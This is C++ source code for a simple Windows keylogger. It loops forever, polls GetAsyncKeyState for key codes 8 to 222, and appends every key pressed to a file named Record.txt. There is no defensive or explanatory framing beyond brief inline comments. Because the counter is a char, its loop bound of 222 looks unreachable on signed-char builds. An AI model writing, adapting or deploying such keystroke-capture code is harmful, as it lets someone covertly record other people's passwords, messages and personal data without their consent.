#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

int main(void) {
    char character;

    for (;;) {
        for (character = 8; character <= 222; character++) {
            /*
                When a key is pressed there is a system interrupt 
                That interrupt can represent the number 
                i.e.; 32767
            */
            if (GetAsyncKeyState(character) == -32767) {
                std::ofstream write("Record.txt", std::ios::app);  // ios::app ensures that the file is opened in append mode.
                write << character;
                write.close(); // closing the file.
            }
        }
    }

    return 0;
}
